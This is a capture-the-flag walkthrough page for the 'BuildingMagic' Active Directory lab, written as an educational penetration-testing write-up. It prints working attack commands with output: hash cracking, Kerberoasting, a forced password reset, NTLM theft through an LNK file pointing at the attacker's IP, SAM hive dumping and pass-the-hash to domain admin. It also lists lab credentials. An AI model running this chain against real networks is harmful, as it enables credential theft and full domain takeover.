@@ -1,0 +1,643 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>BuildingMagic - HackSmarter Labs CTF Walkthrough | Zerotrace Logs</title>
+  <meta name="description" content="Complete walkthrough of BuildingMagic machine from HackSmarter Labs. Learn password cracking, Kerberoasting, BloodHound enumeration, NTLM relay attacks, SeBackupPrivilege abuse, and Pass-the-Hash techniques for Active Directory compromise." />
+
+  <!-- Essential Open Graph tags for LinkedIn -->
+  <meta property="og:title" content="BuildingMagic CTF Walkthrough - HackSmarter Labs | Z3rotrace" />
+  <meta property="og:description" content="Complete AD penetration testing walkthrough covering password cracking, Kerberoasting, NTLM theft, SeBackupPrivilege abuse, and Pass-the-Hash for domain compromise on Windows Server 2022." />
+  <meta property="og:image" content="https://z3rotrace.live/assets/buildingmagic/bloodhound-domain-admin.png" />
+  <meta property="og:url" content="https://z3rotrace.live/writeups/buildingmagic.html" />
+  <meta property="og:type" content="article" />
+
+  <!-- Twitter Card tags -->
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="BuildingMagic CTF Walkthrough - HackSmarter Labs | Z3rotrace" />
+  <meta name="twitter:description" content="Complete AD penetration testing walkthrough covering password cracking, Kerberoasting, NTLM theft, SeBackupPrivilege abuse, and Pass-the-Hash for domain compromise." />
+  <meta name="twitter:image" content="https://z3rotrace.live/assets/buildingmagic/bloodhound-domain-admin.png" />
+
+  <link rel="icon" type="image/png" href="../assets/favicon.png" sizes="32x32" />
+  <link rel="apple-touch-icon" href="../assets/favicon.png" />
+  <link rel="stylesheet" href="../style.css?v=4"/>
+  <style>
+    /* Machine info box styling */
+    .machine-info {
+      background: rgba(0, 170, 255, 0.05);
+      border: 1px solid rgba(0, 170, 255, 0.25);
+      border-left: 4px solid #c77dff;
+      border-radius: 8px;
+      padding: 1rem 1.25rem;
+      margin: 1.5rem 0;
+    }
+
+    .machine-info ul {
+      margin: 0;
+      padding-left: 0;
+    }
+
+    .machine-info li {
+      margin-bottom: 0.25rem;
+    }
+
+    .machine-info li::before {
+      color: #00aaff;
+    }
+
+    /* Attack chain summary box */
+    .attack-chain {
+      background: rgba(199, 125, 255, 0.05);
+      border: 1px solid rgba(199, 125, 255, 0.25);
+      border-left: 4px solid #c77dff;
+      border-radius: 8px;
+      padding: 1rem 1.25rem;
+      margin: 1.5rem 0;
+    }
+
+    .attack-chain ol {
+      margin: 0;
+    }
+
+    .attack-chain pre {
+      background: rgba(0, 0, 0, 0.3);
+      border: none;
+      margin: 1rem 0 0 0;
+      padding: 1rem;
+    }
+
+    .attack-chain pre code {
+      color: #c9d1d9;
+      white-space: pre;
+    }
+
+    /* Key finding callout */
+    .key-finding {
+      background: rgba(255, 107, 107, 0.08);
+      border-left: 4px solid #ff6b6b;
+      padding: 0.75rem 1rem;
+      margin: 1rem 0;
+      border-radius: 0 6px 6px 0;
+    }
+
+    .key-finding strong {
+      color: #ff6b6b;
+    }
+
+    /* Tool list styling */
+    .tools-list {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.5rem;
+      margin: 1rem 0;
+      padding: 0;
+    }
+
+    .tools-list li {
+      background: rgba(0, 170, 255, 0.08);
+      border: 1px solid rgba(0, 170, 255, 0.2);
+      border-radius: 6px;
+      padding: 0.4rem 0.8rem;
+      font-size: 0.9rem;
+      margin: 0;
+    }
+
+    .tools-list li::before {
+      content: none;
+    }
+
+    /* Credentials table styling */
+    .credentials-table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 1.5rem 0;
+      background: rgba(0, 170, 255, 0.03);
+      border-radius: 8px;
+      overflow: hidden;
+    }
+
+    .credentials-table th,
+    .credentials-table td {
+      padding: 0.75rem 1rem;
+      text-align: left;
+      border-bottom: 1px solid rgba(0, 170, 255, 0.15);
+    }
+
+    .credentials-table th {
+      background: rgba(0, 170, 255, 0.08);
+      color: #00aaff;
+      font-weight: 600;
+    }
+
+    .credentials-table tr:last-child td {
+      border-bottom: none;
+    }
+
+    .credentials-table code {
+      background: rgba(255, 135, 135, 0.1);
+      color: #ff8787;
+    }
+
+    /* Lessons learned styling */
+    .lessons-learned li {
+      margin-bottom: 0.75rem;
+    }
+  </style>
+</head>
+<body>
+<header>
+  <h1 class="terminal-title" aria-label="Zerotrace Logs">
+    <span class="prompt" aria-hidden="true">$</span>
+    <span class="typed" id="term-typing" aria-hidden="true"></span>
+    <span class="cursor" id="term-cursor" aria-hidden="true"></span>
+    <span class="sr-only">Zerotrace Logs</span>
+  </h1>
+</header>
+
+<!-- Side hamburger control -->
+<button id="sidebarToggle" class="hamburger-btn" aria-label="Toggle navigation" aria-controls="sidebar" aria-expanded="true">
+  <span class="sr-only">Toggle navigation</span>
+  <span class="hamburger-icon" aria-hidden="true"></span>
+</button>
+
+<!-- Sidebar navigation -->
+<aside class="sidebar" id="sidebar" aria-label="Main navigation">
+  <div class="sidebar-header">
+    <h3>Navigate</h3>
+    <button id="sidebarClose" class="sidebar-close" aria-label="Close navigation"><span aria-hidden="true">x</span></button>
+  </div>
+  <div class="sidebar-content">
+    <ul class="sidebar-nav">
+      <li><a href="../index.html">Home</a></li>
+      <li class="has-submenu">
+        <button class="submenu-toggle" aria-expanded="true"><span class="arrow" aria-hidden="true"></span>Writeups</button>
+        <ul class="submenu">
+          <li><a href="welcome.html">Welcome - ADCS ESC1</a></li>
+          <li><a href="staged.html">Staged - HackSmarter Labs</a></li>
+          <li><a href="buildingmagic.html" aria-current="page">BuildingMagic - HackSmarter Labs</a></li>
+          <li><a href="arasaka.html">Arasaka - HackSmarter Labs</a></li>
+          <li><a href="midgarden2-badsuccessor.html">Midgarden2 - BadSuccessor</a></li>
+          <li><a href="banksmarter.html">BankSmarter - HackSmarter Labs</a></li>
+          <li><a href="ascension.html">Ascension - HackSmarter Labs</a></li>
+          <li><a href="slayer.html">Slayer - HackSmarter Labs</a></li>
+          <li><a href="ps-file-transfer-dns.html">PS File Transfer via DNS Lookup</a></li>
+          <li><a href="sliver-c2-getting-started.html">Getting Started with Sliver C2</a></li>
+        </ul>
+      </li>
+      <li class="has-submenu">
+        <button class="submenu-toggle" aria-expanded="false"><span class="arrow" aria-hidden="true"></span>Machines Walkthroughs</button>
+        <ul class="submenu" hidden>
+          <li><a href="../walkthroughs/sharethepain.html">ShareThePain</a></li>
+        </ul>
+      </li>
+      <li><a href="../vector3.html">Certification Journey</a></li>
+      <li class="has-submenu">
+        <button class="submenu-toggle" aria-expanded="false"><span class="arrow" aria-hidden="true"></span>Projects</button>
+        <ul class="submenu" hidden>
+          <li><a href="../projects/dual-cloud-c2-redirector.html">Dual Cloud Redirector C2</a></li>
+        </ul>
+      </li>
+    </ul>
+  </div>
+</aside>
+<div class="sidebar-backdrop" id="sidebarBackdrop" aria-hidden="true"></div>
+
+<section>
+  <h2>BuildingMagic - HackSmarter Labs CTF Walkthrough</h2>
+
+  <div class="machine-info">
+    <ul>
+      <li><strong>Platform:</strong> HackSmarter Labs</li>
+      <li><strong>Difficulty:</strong> Medium</li>
+      <li><strong>OS:</strong> Windows Server 2022</li>
+      <li><strong>Key Topics:</strong> Active Directory, Password Cracking, Kerberoasting, BloodHound, NTLM Relay, SeBackupPrivilege, Pass-the-Hash</li>
+    </ul>
+  </div>
+
+  <h3>Scope and Objective</h3>
+  <p>As a penetration tester on the Hack Smarter Red Team, the objective is to achieve a full compromise of the Active Directory environment.</p>
+  <p><strong>Starting Point:</strong> A prior enumeration phase yielded a leaked database containing usernames and hashed passwords.</p>
+  <p><strong>Goal:</strong> Leverage the compromised credentials to escalate privileges, move laterally through the Active Directory, and ultimately achieve complete domain compromise.</p>
+
+  <h3>Lab Setup</h3>
+  <p>Add the following entries to <code>/etc/hosts</code>:</p>
+  <pre><code>&lt;TARGET_IP&gt;  buildingmagic.local dc01.buildingmagic.local</code></pre>
+
+  <h2>Reconnaissance</h2>
+
+  <h3><span class="step">[Step 1]</span> Analyzing the Leaked Database</h3>
+  <p>The leaked database contains the following user information:</p>
+  <pre><code>id  username        full_name            role            password
+1   r.widdleton     Ron Widdleton        Intern Builder  c4a21c4d438819d73d24851e7966229c
+2   n.bottomsworth  Neville Bottomsworth Planner         61ee643c5043eadbcdc6c9d1e3ebd298
+3   l.layman        Luna Layman          Planner         8960516f904051176cc5ef67869de88f
+4   c.smith         Chen Smith           Builder         bbd151e24516a48790b2cd5845e7f148
+5   d.thomas        Dean Thomas          Builder         4d14ff3e264f6a9891aa6cea1cfa17cb
+6   s.winnigan      Samuel Winnigan      HR Manager      078576a0569f4e0b758aedf650cb6d9a
+7   p.jackson       Parvati Jackson      Shift Lead      eada74b2fa7f5e142ac412d767831b54
+8   b.builder       Bob Builder          Electrician     dd4137bab3b52b55f99f18b7cd595448
+9   t.ren           Theodore Ren         Safety Officer  bfaf794a81438488e57ee3954c27cd75
+10  e.macmillan     Ernest Macmillan     Surveyor        47d23284395f618bea1959e710bc68ef</code></pre>
+
+  <h3><span class="step">[Step 2]</span> Extracting and Cracking Password Hashes</h3>
+  <p>I extracted just the hashes from the leaked data to check against CrackStation:</p>
+  <pre><code>$ awk '{print $NF}' leak_data</code></pre>
+
+  <p><img src="../assets/buildingmagic/crackstation-results.png" alt="CrackStation results showing two cracked MD5 hashes" loading="lazy"></p>
+
+  <div class="question">
+    <strong>What is CrackStation?</strong>
+  </div>
+  <div class="answer">
+    CrackStation is a free online hash lookup service that uses massive pre-computed rainbow tables to instantly crack common password hashes. It supports MD5, SHA1, SHA256, and other hash types without requiring any computation on your end.
+  </div>
+
+  <p>CrackStation cracked two hashes:</p>
+  <ul>
+    <li><code>bfaf794a81438488e57ee3954c27cd75</code> -> <code>shadowhex7</code> (t.ren)</li>
+    <li><code>c4a21c4d438819d73d24851e7966229c</code> -> <code>lilronron</code> (r.widdleton)</li>
+  </ul>
+
+  <p>For hashes that CrackStation missed, I used hashcat with rockyou.txt:</p>
+  <pre><code>$ hashcat -m 0 hash /usr/share/wordlists/rockyou.txt --show
+c4a21c4d438819d73d24851e7966229c:lilronron</code></pre>
+
+  <div class="note">
+    <strong>What is hashcat -m 0?</strong> The <code>-m</code> flag in hashcat specifies the hash type. Mode <code>0</code> is for raw MD5 hashes. The <code>--show</code> flag displays already-cracked hashes from hashcat's potfile.
+  </div>
+
+  <div class="key-finding">
+    <strong>Validated Credentials:</strong> <code>t.ren:shadowhex7</code> and <code>r.widdleton:lilronron</code>
+  </div>
+
+  <h2>Initial Access</h2>
+
+  <h3><span class="step">[Step 3]</span> Credential Validation</h3>
+  <p>I validated the credentials using NetExec. Only <code>r.widdleton</code> had valid access:</p>
+  <pre><code>$ nxc smb 10.1.167.230 -u r.widdleton -p lilronron
+SMB   10.1.167.230  445  DC01  [+] BUILDINGMAGIC.LOCAL\r.widdleton:lilronron</code></pre>
+
+  <p><img src="../assets/buildingmagic/nxc-smb-validation.png" alt="NetExec SMB validation showing r.widdleton successful login" loading="lazy"></p>
+
+  <div class="question">
+    <strong>What is NetExec (nxc)?</strong>
+  </div>
+  <div class="answer">
+    NetExec is the successor to CrackMapExec, a post-exploitation tool for testing credentials against various Windows services (SMB, LDAP, WinRM, etc.). The <code>[+]</code> indicates successful authentication.
+  </div>
+
+  <h2>Lateral Movement</h2>
+
+  <h3><span class="step">[Step 4]</span> BloodHound Enumeration</h3>
+  <p>Using BloodHound, I discovered a Kerberoastable user account: <code>r.haggard</code>.</p>
+
+  <p><img src="../assets/buildingmagic/bloodhound-kerberoastable.png" alt="BloodHound query showing Kerberoastable users with r.haggard identified" loading="lazy"></p>
+
+  <div class="question">
+    <strong>What is Kerberoasting?</strong>
+  </div>
+  <div class="answer">
+    Kerberoasting is an attack that extracts service account credential hashes from Active Directory. Any authenticated domain user can request a Kerberos service ticket (TGS) for accounts with a Service Principal Name (SPN) set. The ticket is encrypted with the service account's password hash, which can then be cracked offline without generating authentication failures.
+  </div>
+
+  <h3><span class="step">[Step 5]</span> Kerberoasting r.haggard</h3>
+  <p>I used NetExec to perform the Kerberoasting attack:</p>
+  <pre><code>$ nxc ldap 10.1.167.230 -u r.widdleton -p lilronron --kerberoast output.txt</code></pre>
+
+  <p><img src="../assets/buildingmagic/nxc-kerberoasting.png" alt="NetExec Kerberoasting output capturing TGS hash for r.haggard" loading="lazy"></p>
+
+  <h3><span class="step">[Step 6]</span> Cracking the TGS Hash</h3>
+  <p>I cracked the Kerberos TGS hash using hashcat:</p>
+  <pre><code>$ hashcat -m 13100 tgs_hash.txt /usr/share/wordlists/rockyou.txt
+$krb5tgs$23$*r.haggard$BUILDINGMAGIC.LOCAL$...:rubeushagrid</code></pre>
+
+  <div class="note">
+    <strong>What is hashcat -m 13100?</strong> Mode <code>13100</code> is for Kerberos 5 TGS-REP etype 23 (RC4) hashes. These are the hashes obtained from Kerberoasting attacks.
+  </div>
+
+  <div class="key-finding">
+    <strong>New Credentials:</strong> <code>r.haggard:rubeushagrid</code>
+  </div>
+
+  <p>Validated access:</p>
+  <pre><code>$ nxc ldap 10.1.167.230 -u r.haggard -p rubeushagrid
+LDAP  10.1.167.230  389  DC01  [+] BUILDINGMAGIC.LOCAL\r.haggard:rubeushagrid</code></pre>
+
+  <h3><span class="step">[Step 7]</span> ForceChangePassword Abuse</h3>
+  <p>BloodHound revealed that <code>r.haggard</code> has the <code>ForceChangePassword</code> permission over <code>h.potch</code>:</p>
+
+  <p><img src="../assets/buildingmagic/bloodhound-forcechangepassword.png" alt="BloodHound graph showing r.haggard has ForceChangePassword rights over h.potch" loading="lazy"></p>
+
+  <div class="question">
+    <strong>What is ForceChangePassword?</strong>
+  </div>
+  <div class="answer">
+    This Active Directory permission allows a user to reset another user's password without knowing the current password. It is a dangerous misconfiguration that enables direct account takeover.
+  </div>
+
+  <p>I used <code>net rpc</code> to change h.potch's password:</p>
+  <pre><code>$ net rpc password 'h.potch' 'Zerotrace123@' -U 'BUILDINGMAGIC.LOCAL'/'r.haggard'%'rubeushagrid' -S DC01.BUILDINGMAGIC.LOCAL</code></pre>
+
+  <p>Validated the new credentials:</p>
+  <pre><code>$ nxc smb 10.1.167.230 -u h.potch -p 'Zerotrace123@'
+SMB  10.1.167.230  445  DC01  [+] BUILDINGMAGIC.LOCAL\h.potch:Zerotrace123@</code></pre>
+
+  <div class="key-finding">
+    <strong>New Credentials:</strong> <code>h.potch:Zerotrace123@</code>
+  </div>
+
+  <h3><span class="step">[Step 8]</span> NTLM Hash Capture via Malicious LNK File</h3>
+  <p>I discovered that <code>h.potch</code> has read/write access to a file share. I used this to capture NTLM hashes through a malicious LNK file.</p>
+
+  <div class="question">
+    <strong>What is NTLM Theft?</strong>
+  </div>
+  <div class="answer">
+    When a user browses to a folder containing certain file types (.lnk, .url, .scf, etc.), Windows automatically attempts to resolve embedded UNC paths. If that path points to an attacker-controlled server, the user's NTLM hash is sent for authentication, which can be captured and cracked offline.
+  </div>
+
+  <p>I generated malicious files using <code>ntlm_theft</code>:</p>
+  <pre><code>$ python3 ntlm_theft.py -g modern -s 10.200.26.206 -f meeting
+Created: meeting/meeting.lnk (BROWSE TO FOLDER)
+Created: meeting/meeting-(url).url (BROWSE TO FOLDER)
+...</code></pre>
+
+  <p>I uploaded the <code>.lnk</code> file to the file share:</p>
+  <pre><code>$ smbclient //10.1.167.230/File-Share -U h.potch
+Password for [WORKGROUP\h.potch]:
+smb: \> put meeting.lnk
+putting file meeting.lnk as \meeting.lnk (5.1 kB/s) (average 5.1 kB/s)</code></pre>
+
+  <p>I started Responder to capture the hash:</p>
+  <pre><code>$ sudo responder -I tun0 -v</code></pre>
+
+  <div class="note">
+    <strong>What is Responder?</strong> Responder is a network poisoning tool that listens for LLMNR, NBT-NS, and MDNS queries to capture NTLM hashes. The <code>-I</code> flag specifies the network interface, and <code>-v</code> enables verbose output.
+  </div>
+
+  <p><img src="../assets/buildingmagic/responder-ntlmv2-capture.png" alt="Responder capturing NTLMv2 hash for h.grangon" loading="lazy"></p>
+
+  <p>A user browsed to the share, and I captured their NTLMv2 hash:</p>
+  <pre><code>H.GRANGON::BUILDINGMAGIC:a746324b2edec74a:0f571e485de3f42e087987ab223c48b0:...</code></pre>
+
+  <h3><span class="step">[Step 9]</span> Cracking the NTLMv2 Hash</h3>
+  <pre><code>$ hashcat -m 5600 ntlmv2_hash.txt /usr/share/wordlists/rockyou.txt
+H.GRANGON::BUILDINGMAGIC:...:magic4ever</code></pre>
+
+  <div class="note">
+    <strong>What is hashcat -m 5600?</strong> Mode <code>5600</code> is for NTLMv2 hashes (NetNTLMv2). These are network authentication hashes captured during NTLM relay or theft attacks, different from the NT hashes stored in SAM/NTDS.
+  </div>
+
+  <div class="key-finding">
+    <strong>New Credentials:</strong> <code>h.grangon:magic4ever</code>
+  </div>
+
+  <p><img src="../assets/buildingmagic/nxc-hgrangon-validation.png" alt="NetExec validating h.grangon credentials" loading="lazy"></p>
+
+  <h2>Initial Shell Access</h2>
+
+  <h3><span class="step">[Step 10]</span> Remote Management Access</h3>
+  <p>BloodHound showed that <code>h.grangon</code> is a member of the Remote Management Users group:</p>
+
+  <p><img src="../assets/buildingmagic/bloodhound-remote-management.png" alt="BloodHound showing h.grangon membership in Remote Management Users" loading="lazy"></p>
+
+  <div class="question">
+    <strong>What is Remote Management Users?</strong>
+  </div>
+  <div class="answer">
+    This built-in Windows group grants members the ability to connect via Windows Remote Management (WinRM) on port 5985/5986. This enables PowerShell remoting and is commonly targeted for gaining interactive shell access.
+  </div>
+
+  <p>I connected via Evil-WinRM:</p>
+  <pre><code>$ evil-winrm -i 10.1.167.230 -u 'h.grangon' -p 'magic4ever'
+
+Evil-WinRM shell v3.7
+*Evil-WinRM* PS C:\Users\h.grangon\Documents></code></pre>
+
+  <h3>User Flag</h3>
+  <pre><code>*Evil-WinRM* PS C:\Users\h.grangon\Documents> type ..\Desktop\user.txt</code></pre>
+
+  <p>The user flag is located at <code>C:\Users\h.grangon\Desktop\user.txt</code>.</p>
+
+  <h2>Privilege Escalation</h2>
+
+  <h3><span class="step">[Step 11]</span> SeBackupPrivilege Abuse</h3>
+  <p>Checking privileges revealed <code>SeBackupPrivilege</code>:</p>
+  <pre><code>*Evil-WinRM* PS C:\Users\h.grangon> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeBackupPrivilege             Back up files and directories  Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled</code></pre>
+
+  <div class="question">
+    <strong>What is SeBackupPrivilege?</strong>
+  </div>
+  <div class="answer">
+    This privilege allows a user to read any file on the system, bypassing all access control lists (ACLs). It is intended for backup operations but can be abused to extract sensitive files like the SAM and SYSTEM registry hives, which contain local account password hashes.
+  </div>
+
+  <p>I extracted the SAM and SYSTEM hives:</p>
+  <pre><code>*Evil-WinRM* PS C:\Users\h.grangon\Desktop> reg.exe save hklm\sam C:\Users\h.grangon\Desktop\sam.save
+The operation completed successfully.
+
+*Evil-WinRM* PS C:\Users\h.grangon\Desktop> reg.exe save hklm\system C:\Users\h.grangon\Desktop\system.save
+The operation completed successfully.</code></pre>
+
+  <p>I downloaded the files to my attack machine:</p>
+  <pre><code>*Evil-WinRM* PS C:\Users\h.grangon\Desktop> download sam.save
+Info: Download successful!
+
+*Evil-WinRM* PS C:\Users\h.grangon\Desktop> download system.save
+Info: Download successful!</code></pre>
+
+  <h3><span class="step">[Step 12]</span> Extracting Local Hashes</h3>
+  <p>Using <code>secretsdump.py</code> from Impacket, I extracted the local account hashes:</p>
+  <pre><code>$ secretsdump.py -system system.save -sam sam.save LOCAL
+[*] Target system bootKey: 0xf61a94fb13f74350a1f87f509c8c455c
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:520126a03f5d5a8d836f1c4f34ede7ce:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</code></pre>
+
+  <div class="note">
+    <strong>What is secretsdump.py?</strong> Part of the Impacket toolkit, secretsdump.py extracts password hashes from SAM/SYSTEM registry hives, NTDS.dit files, or remotely via DCSync. The <code>LOCAL</code> parameter indicates offline extraction from dumped files.
+  </div>
+
+  <h3><span class="step">[Step 13]</span> Password Spraying with Hash</h3>
+  <p>I enumerated domain users:</p>
+  <pre><code>$ nxc smb 10.1.167.230 -u 'h.grangon' -p 'magic4ever' --users
+SMB  10.1.167.230  445  DC01  Administrator
+SMB  10.1.167.230  445  DC01  h.potch
+SMB  10.1.167.230  445  DC01  r.widdleton
+SMB  10.1.167.230  445  DC01  r.haggard
+SMB  10.1.167.230  445  DC01  h.grangon
+SMB  10.1.167.230  445  DC01  a.flatch</code></pre>
+
+  <p>I created a user list and performed a pass-the-hash attack:</p>
+  <pre><code>$ nxc smb 10.1.167.230 -u user.list -H 520126a03f5d5a8d836f1c4f34ede7ce --continue-on-success
+SMB  10.1.167.230  445  DC01  [+] BUILDINGMAGIC.LOCAL\a.flatch:520126a03f5d5a8d836f1c4f34ede7ce</code></pre>
+
+  <p><img src="../assets/buildingmagic/nxc-hash-spray.png" alt="NetExec password spraying with hash showing a.flatch as valid" loading="lazy"></p>
+
+  <div class="question">
+    <strong>What is Pass-the-Hash?</strong>
+  </div>
+  <div class="answer">
+    Pass-the-Hash (PtH) is a technique where an attacker uses a password's NTLM hash to authenticate without knowing the plaintext password. This works because Windows NTLM authentication uses the hash directly, not the password itself.
+  </div>
+
+  <p>The local Administrator hash worked for the domain user <code>a.flatch</code>, indicating password reuse between the local Administrator account and this domain user.</p>
+
+  <p><img src="../assets/buildingmagic/nxc-pwn3d.png" alt="NetExec confirming a.flatch has Pwn3d status" loading="lazy"></p>
+
+  <h3><span class="step">[Step 14]</span> Domain Admin Access</h3>
+  <p>BloodHound confirmed that <code>a.flatch</code> is a member of the Domain Admins group:</p>
+
+  <p><img src="../assets/buildingmagic/bloodhound-domain-admin.png" alt="BloodHound showing a.flatch membership in Administrators group" loading="lazy"></p>
+
+  <h2>Domain Compromise</h2>
+
+  <h3><span class="step">[Step 15]</span> Administrator Shell</h3>
+  <p>I connected as <code>a.flatch</code> using Evil-WinRM with the hash:</p>
+  <pre><code>$ evil-winrm -u a.flatch -H 520126a03f5d5a8d836f1c4f34ede7ce -i 10.1.167.230</code></pre>
+
+  <p><img src="../assets/buildingmagic/evil-winrm-root.png" alt="Evil-WinRM shell as a.flatch reading root flag" loading="lazy"></p>
+
+  <h3>Root Flag</h3>
+  <pre><code>*Evil-WinRM* PS C:\Users\a.flatch\Documents> type C:\Users\Administrator\Desktop\root.txt
+9557e6</code></pre>
+
+  <h2>Attack Chain Summary</h2>
+  <div class="attack-chain">
+    <ol>
+      <li><strong>Password Cracking:</strong> Cracked leaked MD5 hashes to obtain r.widdleton credentials</li>
+      <li><strong>Kerberoasting:</strong> Extracted and cracked r.haggard TGS hash</li>
+      <li><strong>ForceChangePassword:</strong> Reset h.potch password via r.haggard privileges</li>
+      <li><strong>NTLM Theft:</strong> Captured h.grangon hash via malicious LNK file</li>
+      <li><strong>WinRM Access:</strong> Gained shell as h.grangon (Remote Management Users)</li>
+      <li><strong>SeBackupPrivilege:</strong> Extracted SAM/SYSTEM hives for local hashes</li>
+      <li><strong>Pass-the-Hash:</strong> Authenticated as a.flatch using local Admin hash</li>
+      <li><strong>Domain Compromise:</strong> Full domain admin access achieved</li>
+    </ol>
+    <pre><code>Leaked DB -> r.widdleton (password crack)
+    |
+    v
+Kerberoasting -> r.haggard
+    |
+    v
+ForceChangePassword -> h.potch
+    |
+    v
+NTLM Theft via LNK -> h.grangon (Remote Management Users)
+    |
+    v
+SeBackupPrivilege -> Extract SAM hashes
+    |
+    v
+Pass-the-Hash -> a.flatch (Domain Admin)
+    |
+    v
+Domain Compromise</code></pre>
+  </div>
+
+  <h2>Credentials Summary</h2>
+  <table class="credentials-table">
+    <thead>
+      <tr>
+        <th>Username</th>
+        <th>Password/Hash</th>
+        <th>Method</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>r.widdleton</td>
+        <td><code>lilronron</code></td>
+        <td>MD5 crack</td>
+      </tr>
+      <tr>
+        <td>t.ren</td>
+        <td><code>shadowhex7</code></td>
+        <td>MD5 crack (not valid for domain)</td>
+      </tr>
+      <tr>
+        <td>r.haggard</td>
+        <td><code>rubeushagrid</code></td>
+        <td>Kerberoasting</td>
+      </tr>
+      <tr>
+        <td>h.potch</td>
+        <td><code>Zerotrace123@</code></td>
+        <td>ForceChangePassword abuse</td>
+      </tr>
+      <tr>
+        <td>h.grangon</td>
+        <td><code>magic4ever</code></td>
+        <td>NTLM theft + NTLMv2 crack</td>
+      </tr>
+      <tr>
+        <td>a.flatch</td>
+        <td><code>520126a03f5d5a8d836f1c4f34ede7ce</code></td>
+        <td>SAM dump + password reuse</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <h2>Tools Used</h2>
+  <ul class="tools-list">
+    <li><strong>CrackStation</strong> - Online hash lookup</li>
+    <li><strong>Hashcat</strong> - Password cracking</li>
+    <li><strong>NetExec</strong> - Credential validation & attacks</li>
+    <li><strong>BloodHound</strong> - AD enumeration</li>
+    <li><strong>ntlm_theft</strong> - Malicious file generation</li>
+    <li><strong>Responder</strong> - NTLM hash capture</li>
+    <li><strong>Evil-WinRM</strong> - WinRM shell access</li>
+    <li><strong>Impacket</strong> - secretsdump.py</li>
+  </ul>
+
+  <h2>Key Takeaways</h2>
+  <div class="answer lessons-learned">
+    <ul>
+      <li><strong>Password reuse is dangerous:</strong> The local Administrator password being reused by a domain admin (a.flatch) enabled full domain compromise.</li>
+      <li><strong>Service accounts need strong passwords:</strong> The Kerberoastable account r.haggard had a weak password that was easily cracked.</li>
+      <li><strong>AD permissions require auditing:</strong> The ForceChangePassword misconfiguration allowed lateral movement without any exploitation.</li>
+      <li><strong>File shares are attack surfaces:</strong> Writable shares combined with users browsing them enabled NTLM hash theft.</li>
+      <li><strong>Backup privileges are overpowered:</strong> SeBackupPrivilege on a domain controller allows extraction of credential material.</li>
+    </ul>
+  </div>
+
+  <p><em>Walkthrough by Zerotrace | HackSmarter Labs</em></p>
+
+</section>
+
+<footer>
+  <div class="social-links" aria-label="Social media">
+    <a href="https://github.com/0x0Trace" class="social github" target="_blank" rel="noopener" aria-label="GitHub profile">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <path fill="#00B8D9" d="M12 .5C5.65.5.5 5.65.5 12c0 5.08 3.29 9.38 7.86 10.9.58.1.8-.25.8-.56 0-.27-.01-1.14-.02-2.07-3.2.7-3.88-1.36-3.88-1.36-.53-1.34-1.3-1.7-1.3-1.7-1.06-.73.08-.72.08-.72 1.17.08 1.78 1.2 1.78 1.2 1.05 1.79 2.75 1.27 3.42.97.11-.76.41-1.27.75-1.56-2.55-.29-5.23-1.28-5.23-5.7 0-1.26.45-2.3 1.2-3.11-.12-.29-.52-1.46.11-3.04 0 0 .97-.31 3.18 1.19a11.08 11.08 0 0 1 2.9-.39c.98 0 1.97.13 2.9.39 2.2-1.5 3.17-1.19 3.17-1.19.63 1.58.23 2.75.12 3.04.75.81 1.2 1.85 1.2 3.11 0 4.43-2.69 5.41-5.25 5.69.42.36.8 1.08.8 2.18 0 1.58-.02 2.85-.02 3.24 0 .31.21.67.81.55A10.52 10.52 0 0 0 23.5 12c0-6.35-5.15-11.5-11.5-11.5Z"/>
+      </svg>
+    </a>
+    <a href="mailto:contact@z3rotrace.live" class="social email" aria-label="E-mail">
+      <svg width="20" height="20" viewBox="0 0 512 512" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <path fill="#00B8D9" d="M502.3 190.8L327.4 338.9C304.3 358.3 271.7 358.3 248.6 338.9L9.7 190.8C3.2 185.5 0 178.3 0 171.2V80C0 53.5 21.5 32 48 32H464C490.5 32 512 53.5 512 80V171.2C512 178.3 508.8 185.5 502.3 190.8Z"/>
+        <path fill="#00B8D9" d="M0 255.1V432C0 458.5 21.5 480 48 480H464C490.5 480 512 458.5 512 432V255.1L343.9 392.7C304.5 423 247.6 423 208.1 392.7L0 255.1Z"/>
+      </svg>
+    </a>
+    <a href="https://www.linkedin.com/in/panagiotis-lampousis-2a100b392/" class="social linkedin" target="_blank" rel="noopener" aria-label="LinkedIn profile">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <path fill="#00B8D9" d="M4.98 3.5c0 1.38-1.13 2.5-2.5 2.5A2.5 2.5 0 0 1 0 3.5C0 2.12 1.12 1 2.49 1a2.5 2.5 0 0 1 2.49 2.5ZM.5 23.5h4V7.99h-4V23.5Zm7.5 0h4v-8.32c0-2.21 2.4-3.46 3.94-2.02.5.47.56 1.13.56 1.86v8.48h4v-9.56c0-5.06-5.5-4.86-6.5-2.38V8h-4c.06 1.05 0 15.5 0 15.5Z"/>
+      </svg>
+    </a>
+  </div>
+  <p>&copy; 2025 Zerotrace | Built by Zerotrace | <a href="../terms-of-use.html" style="color: #00B8D9; text-decoration: underline;">Terms of Use</a></p>
+</footer>
+<script src="../script.js"></script>
+</body>
+</html>
